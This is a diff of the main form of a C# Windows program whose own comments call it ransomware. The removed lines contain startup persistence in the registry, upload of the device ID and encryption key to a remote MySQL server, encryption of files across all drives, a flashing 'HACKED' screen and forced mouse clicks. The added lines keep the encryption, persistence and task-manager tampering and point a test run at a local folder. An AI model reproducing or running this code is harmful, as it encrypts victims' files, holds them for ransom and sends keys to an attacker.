@@ -1,25 +1,19 @@
-﻿using DeviceId;
-using Microsoft.Win32;
-using MySql.Data.MySqlClient;
+﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Data;
 using System.Drawing;
 using System.IO;
 using System.Linq;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Runtime.InteropServices.WindowsRuntime;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace takecare
 {
     public partial class FrmMain : Form
     {
-        private readonly bool debug = Properties.Settings.Default.debug;
-        private readonly string extension = Properties.Settings.Default.extension;
-        private readonly string defaultMessage = Properties.Settings.Default.message;
+        private static readonly bool debug = Properties.Settings.Default.debug;
+        private static readonly string defaultExtension = Properties.Settings.Default.extension;
+        private static readonly string defaultMessage = Properties.Settings.Default.message;
         private enum CypherMode
         {
             Encode,
@@ -46,8 +40,6 @@ namespace takecare
             InitializeComponent();
         }
 
-        // This method is used to create a log file. This is mainly used for debugging when changing 
-        // the ransomware itself or adding new features on your own. I at least used it for crash reports.
         public void Log(string text, string title)
         {
             try
@@ -60,13 +52,11 @@ namespace takecare
             } catch { }
         }
 
-        // So this is pretty straight forward. This code tries to register the ransomware into the registry startup.
-        // in order to enable this feature you need to go into the "Form1_Load()" method and add "RegisterStartup(true);". Theoretically.
         private void RegisterStartup(bool isChecked)
         {
             try
             {
-                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
 
                 if (isChecked)
                 {
@@ -83,46 +73,12 @@ namespace takecare
             }
         }
 
-        // This method is used to check the basic needs for the ransomware, like if the encryption key was ever set,
-        // or its lenght is the correct size etc..
         private void Setup()
         {
-            GenerateKeys();
             GenerateRandomApplicationName();
+            GenerateKeys();
             ChangeProcessMode();
             ChangeTaskManagerAccess();
-            ChangeDesktopScreem();
-        }
-
-        private void ChangeDesktopScreem()
-        {
-            // Check what kind of theme is selected. You can find more information about this in Github Wiki
-            if (Properties.Settings.Default.theme == "default")
-            {
-                panel_theme_flash.Visible = false;
-                panel_theme_flash.Enabled = false;
-            }
-            else if (Properties.Settings.Default.theme == "flash")
-            {
-                // Set Window to be Fullscreen and overlap
-                this.WindowState = FormWindowState.Maximized;
-                this.FormBorderStyle = FormBorderStyle.None;
-
-                // Enable the Panel Control and make it fill the Screen
-                panel_theme_flash.Visible = true;
-                panel_theme_flash.Enabled = true;
-                panel_theme_flash.Dock = DockStyle.Fill;
-
-                // Position the Label and set its Text
-                label_theme_flash.Text = "HACKED";
-                label_theme_flash.Font = new Font(label_theme_flash.Font.FontFamily, this.Height / 16, label_theme_flash.Font.Style);
-                label_theme_flash.Location = new Point((panel_theme_flash.Width / 2) - (label_theme_flash.Width / 2), (panel_theme_flash.Height / 2) - (label_theme_flash.Height / 2));
-
-                // Setting up the Timer and the method
-                timer_theme_lash.Enabled = true;
-                timer_theme_lash.Interval = 1000;
-                timer_theme_lash.Tick += new EventHandler(timer_theme_flash_tick);
-            }
         }
 
         private void ChangeTaskManagerAccess()
@@ -206,102 +162,18 @@ namespace takecare
             ProcessMananger.ProcessKillable();
         }
 
-        // This is used for the theme feature were there is once theme that flashes color.
-        // This is responsible for the flashing part. You can change 'backcolor' and 'forecolor'
-        // to something to your likings.
-        private void timer_theme_flash_tick(object sender, EventArgs e)
-        {
-            // Switches the Color of the Panel and Label
-
-            Color backcolor = Color.Red;            // Background Color
-            Color forecolor = Color.Black;          // Font Color
-
-            if(panel_theme_flash.BackColor == backcolor)
-            {
-                panel_theme_flash.BackColor = forecolor;
-                label_theme_flash.ForeColor = backcolor;
-            }
-            else
-            {
-                panel_theme_flash.BackColor = backcolor;
-                label_theme_flash.ForeColor = forecolor;
-            }
-        }
-
-        // This is the entry point for the whole ransomware. Everything you put there 
-        // will be executed first. Well at list this is where the program pointer will be set to.
         private void FrmMain_Load(object sender, EventArgs e)
         {
-            string deviceId = string.Empty;
+            //Simple "Styling"
+            //ShowInTaskbar = false;
+            //ShowIcon = false;
+            //Text = "";
 
-            // Simple "Styling"
-            ShowInTaskbar = false;
-            Text = "";
-            ShowIcon = false;
-            // Will make the ransomware overlay other applications
-            //this.TopMost = true;    
+            //Setup();
 
-            // Check if generated Strings are set like Application Name, Encryption Key, etc... are set
-            Setup();
+            //ChangePanelSettings();
 
-            // Register application to startup.
-            RegisterStartup(true);
-
-            timer1.Enabled = true;
-            timer1.Start();
-
-            ChangePanelSettings();
-
-            // the following code will register the victims machine on the mysql database server. 
-            // this includes the generated deviceId and the encryption key.
-            if (Properties.Settings.Default.db_enable == true)
-            {
-                // Connection String for MySQL Connection, if enabled.
-                string myConnectionString = GetConnectionString();
-
-                try
-                {
-                    MySqlConnection connection = new MySqlConnection(myConnectionString);
-                    MySqlCommand command = connection.CreateCommand();
-                    
-                    command.CommandText = $@"INSERT INTO machine (deviceID,pass) VALUES ('{MachineMananger.GetDeviceInfo()}', '{Properties.Settings.Default.key}')";
-                    connection.Open();
-                    
-                    IDataReader Reader = command.ExecuteReader();
-
-                    while (Reader.Read())
-                    {
-                        string row = "";
-                        for (int i = 0; i < Reader.FieldCount; i++)
-                            row += Reader.GetValue(i).ToString() + ", ";
-                        Console.WriteLine(row);
-                    }
-                    connection.Close();
-                }
-                catch (Exception ex)
-                {
-                    if (ex.Message.Contains("DUPLICATE"))
-                    {
-
-                    }
-                    else
-                    {
-                        Log(ex.Message, "Form1_Load > MySQL");
-                    }
-                }
-            }
-
-            // This will try to get as many files as possible.
-            // Its not perferct and might fail sometimes on some drives etc..
-            Task.Run(() => ManageDrives(CypherMode.Encode));
-        }
-
-        private static string GetConnectionString()
-        {
-            return $@"SERVER={Properties.Settings.Default.db_host};
-                      DATABASE={Properties.Settings.Default.db_database};
-                      UID={Properties.Settings.Default.db_user}; 
-                      PASSWORD={Properties.Settings.Default.db_pass};";
+            //ManangeDrives(CypherMode.Encode);
         }
 
         private void ChangePanelSettings()
@@ -331,14 +203,12 @@ namespace takecare
                         {
                             string extension = Path.GetExtension(filePath);
 
-                            if (IsValidExtension(extension))
-                            {
                                 switch (mode)
                                 {
                                     case CypherMode.Encode:
-                                        if (FileManager.HasExtension(filePath, extension)) break;
+                                        if (!IsValidExtension(extension)) break;
 
-                                        newFilePath = FileManager.AddExtension(filePath, extension);
+                                        newFilePath = FileManager.AddExtension(filePath, defaultExtension);
 
                                         CryptoManager.EncodeFile(filePath, newFilePath, defaultKey);
 
@@ -348,9 +218,9 @@ namespace takecare
                                         break;
 
                                     case CypherMode.Decode:
-                                        if (!FileManager.HasExtension(filePath, extension)) break;
+                                        if (!FileManager.HasExtension(filePath, defaultExtension)) break;
 
-                                        newFilePath = FileManager.RemoveExtension(filePath, extension);
+                                        newFilePath = FileManager.RemoveExtension(filePath, defaultExtension);
 
                                         CryptoManager.DecodeFile(filePath, newFilePath, defaultKey);
 
@@ -361,7 +231,6 @@ namespace takecare
 
                                     default: throw new NotSupportedException();
                                 }
-                            }
                         }
 
                         ChangeAllFiles(folder);
@@ -397,7 +266,7 @@ namespace takecare
             }
         }
 
-        private void ManageDrives(CypherMode mode)
+        private void ManangeDrives(CypherMode mode)
         {
             foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
@@ -427,35 +296,6 @@ namespace takecare
             }
         }
 
-        // used for the mouse click simulation. This is important and should not be touched.
-        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
-        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
-        private const int MOUSEEVENTF_LEFTUP = 0x04;
-
-        public void DoMouseClick()  // makes the mouse click.
-        {
-            // x and y are the locations where the mouse click will be performed. in this case, in the middle of the screen.
-            uint X = (uint)Screen.PrimaryScreen.WorkingArea.Width / 2;
-            uint Y = (uint)Screen.PrimaryScreen.WorkingArea.Height / 2;
-            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
-        }
-
-        // This is the code used to move the mouse to a certain position and perform a mouse click
-        // On default, the mouse position will be set to the center of the screen
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            Point leftTop = new Point(Screen.PrimaryScreen.WorkingArea.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
-            Cursor.Position = leftTop;
-
-            // If mouse click is enabled (set to "true" in Project Settings) , the mouse will be clicked each intervall. 
-            // This might be a work around for diabling ALT + Tab etc...
-            if (Properties.Settings.Default.clickMouse == true)
-            {
-                DoMouseClick();
-            }
-        }
-
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
@@ -463,10 +303,13 @@ namespace takecare
 
         private void BtnDecrypt_Click(object sender, EventArgs e)
         {
-            if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
+            /*if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
             {
-                ManageDrives(CypherMode.Decode);
-            }
+                ManangeDrives(CypherMode.Decode);
+            }*/
+            GenerateKeys();
+            ChangeAllFiles(@"D:\testDir");
+            ChangeAllFiles(@"D:\testDir", CypherMode.Decode);
         }
     }
 }
